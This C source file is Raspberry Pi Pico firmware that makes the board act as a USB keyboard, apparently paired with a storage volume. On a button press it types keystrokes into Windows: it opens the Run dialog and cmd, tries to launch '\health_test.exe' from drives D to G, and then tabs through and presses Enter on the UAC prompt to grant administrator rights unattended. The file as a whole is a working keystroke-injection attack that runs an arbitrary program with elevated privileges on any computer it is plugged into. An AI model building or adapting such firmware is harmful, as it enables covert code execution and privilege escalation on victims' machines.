#include <pico/stdlib.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <bsp/board.h>
#include <tusb.h>
#include "hardware/gpio.h"
#include "hid_config.h"

#define BUTTON_PIN 20

// Function prototypes
void hid_task(void);
void led_blinking_task(void);

int main(void)
{
    board_init();
    tusb_init();
    printf("\033[2J\033[H");
    tud_init(BOARD_TUD_RHPORT);
    stdio_init_all();

    gpio_init(BUTTON_PIN);
    gpio_set_dir(BUTTON_PIN, GPIO_IN);
    gpio_pull_up(BUTTON_PIN);

    printf("HID+Storage ready, button on GP%d\n", BUTTON_PIN);

    while (true)
    {
        tud_task();
        led_blinking_task();
        hid_task();
    }
    return 0;
}

void tud_mount_cb(void) { printf("USB Device mounted\n"); }
void tud_umount_cb(void) { printf("USB Device unmounted\n"); }
void tud_suspend_cb(bool remote_wakeup_en) { (void)remote_wakeup_en; }
void tud_resume_cb(void) { printf("USB resumed\n"); }

//--------------------------------------------------------------------+
// USB HID
//--------------------------------------------------------------------+

typedef struct
{
    uint8_t modifier;
    uint8_t key;
} key_action_t;

#define MAX_SEQ 512
static key_action_t sequence[MAX_SEQ];
static int seq_len = 0;

static void build_sequence(void)
{
    seq_len = 0;

    // Win+R
    sequence[seq_len++] = (key_action_t){KEYBOARD_MODIFIER_LEFTGUI, HID_KEY_R};
    sequence[seq_len++] = (key_action_t){0, 0};

    // Wait longer for Run dialog
    for (int i = 0; i < 15; i++)
    {
        sequence[seq_len++] = (key_action_t){0, 0};
    }

    // Type: cmd
    sequence[seq_len++] = (key_action_t){0, HID_KEY_C};
    sequence[seq_len++] = (key_action_t){0, 0};
    for (int i = 0; i < 2; i++)
        sequence[seq_len++] = (key_action_t){0, 0};

    sequence[seq_len++] = (key_action_t){0, HID_KEY_M};
    sequence[seq_len++] = (key_action_t){0, 0};
    for (int i = 0; i < 2; i++)
        sequence[seq_len++] = (key_action_t){0, 0};

    sequence[seq_len++] = (key_action_t){0, HID_KEY_D};
    sequence[seq_len++] = (key_action_t){0, 0};
    for (int i = 0; i < 2; i++)
        sequence[seq_len++] = (key_action_t){0, 0};

    // Press Enter
    sequence[seq_len++] = (key_action_t){0, HID_KEY_ENTER};
    sequence[seq_len++] = (key_action_t){0, 0};

    // Wait for CMD to open
    for (int i = 0; i < 25; i++)
    {
        sequence[seq_len++] = (key_action_t){0, 0};
    }

    // Try drives D, E, F, G only
    char drives[] = "DEFG";
    for (int d = 0; d < 4; d++)
    {
        // Drive letter
        sequence[seq_len++] = (key_action_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_A + (drives[d] - 'A')};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 3; i++)
            sequence[seq_len++] = (key_action_t){0, 0};

        // Colon :
        sequence[seq_len++] = (key_action_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_SEMICOLON};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 3; i++)
            sequence[seq_len++] = (key_action_t){0, 0};

        // Backslash (using forward slash to avoid multi-line comment warning)
        sequence[seq_len++] = (key_action_t){0, HID_KEY_BACKSLASH};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 3; i++)
            sequence[seq_len++] = (key_action_t){0, 0};

        // h
        sequence[seq_len++] = (key_action_t){0, HID_KEY_H};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // e
        sequence[seq_len++] = (key_action_t){0, HID_KEY_E};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // a
        sequence[seq_len++] = (key_action_t){0, HID_KEY_A};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // l
        sequence[seq_len++] = (key_action_t){0, HID_KEY_L};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // t
        sequence[seq_len++] = (key_action_t){0, HID_KEY_T};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // h
        sequence[seq_len++] = (key_action_t){0, HID_KEY_H};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // _
        sequence[seq_len++] = (key_action_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_MINUS};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // t
        sequence[seq_len++] = (key_action_t){0, HID_KEY_T};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // e
        sequence[seq_len++] = (key_action_t){0, HID_KEY_E};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // s
        sequence[seq_len++] = (key_action_t){0, HID_KEY_S};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // t
        sequence[seq_len++] = (key_action_t){0, HID_KEY_T};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // .
        sequence[seq_len++] = (key_action_t){0, HID_KEY_PERIOD};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // e
        sequence[seq_len++] = (key_action_t){0, HID_KEY_E};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // x
        sequence[seq_len++] = (key_action_t){0, HID_KEY_X};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};
        // e
        sequence[seq_len++] = (key_action_t){0, HID_KEY_E};
        sequence[seq_len++] = (key_action_t){0, 0};
        for (int i = 0; i < 2; i++)
            sequence[seq_len++] = (key_action_t){0, 0};

        // Enter
        sequence[seq_len++] = (key_action_t){0, HID_KEY_ENTER};
        sequence[seq_len++] = (key_action_t){0, 0};

        // Wait between attempts
        for (int i = 0; i < 5; i++)
        {
            sequence[seq_len++] = (key_action_t){0, 0};
        }
    }

    // Wait for program to open
    for (int i = 0; i < 30; i++)
    {
        sequence[seq_len++] = (key_action_t){0, 0};
    }

    // Complete UAC - Tab Tab Enter
    sequence[seq_len++] = (key_action_t){0, HID_KEY_TAB};
    sequence[seq_len++] = (key_action_t){0, 0};
    for (int i = 0; i < 8; i++)
        sequence[seq_len++] = (key_action_t){0, 0};

    sequence[seq_len++] = (key_action_t){0, HID_KEY_TAB};
    sequence[seq_len++] = (key_action_t){0, 0};
    for (int i = 0; i < 8; i++)
        sequence[seq_len++] = (key_action_t){0, 0};

    sequence[seq_len++] = (key_action_t){0, HID_KEY_ENTER};
    sequence[seq_len++] = (key_action_t){0, 0};

    printf("Sequence built: %d keys\n", seq_len);
}

void hid_task(void)
{
    const uint32_t interval_ms = 25;
    static uint32_t start_ms = 0;

    enum
    {
        ST_IDLE,
        ST_SENDING,
        ST_DONE
    };
    static int state = ST_IDLE;
    static int seq_index = 0;

    if (board_millis() - start_ms < interval_ms)
        return;
    start_ms = board_millis();

    uint32_t const btn = !gpio_get(BUTTON_PIN);

    switch (state)
    {
    case ST_IDLE:
        if (btn && tud_hid_ready())
        {
            build_sequence();
            seq_index = 0;
            state = ST_SENDING;
        }
        break;

    case ST_SENDING:
        if (tud_hid_ready() && seq_index < seq_len)
        {
            key_action_t act = sequence[seq_index++];

            if (act.key || act.modifier)
            {
                uint8_t kc[6] = {act.key, 0, 0, 0, 0, 0};
                tud_hid_keyboard_report(REPORT_ID_KEYBOARD, act.modifier, kc);
            }
            else
            {
                tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, NULL);
            }
        }
        else if (seq_index >= seq_len)
        {
            state = ST_DONE;
            printf("Done\n");
        }
        break;

    case ST_DONE:
        if (!btn)
            state = ST_IDLE;
        break;
    }
}

// USB HID callbacks with unused parameters marked
void tud_hid_report_complete_cb(uint8_t instance, uint8_t const *report, uint16_t len)
{
    (void)instance;
    (void)report;
    (void)len;
}

uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t *buffer, uint16_t reqlen)
{
    (void)instance;
    (void)report_id;
    (void)report_type;
    (void)buffer;
    (void)reqlen;
    return 0;
}

void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type, uint8_t const *buffer, uint16_t bufsize)
{
    (void)instance;
    (void)report_id;
    (void)report_type;
    (void)buffer;
    (void)bufsize;
}

void led_blinking_task(void)
{
    const uint32_t interval_ms = 1000;
    static uint32_t start_ms = 0;
    static bool led_state = false;

    if (board_millis() - start_ms < interval_ms)
        return;
    start_ms += interval_ms;

    board_led_write(led_state);
    led_state = 1 - led_state;
}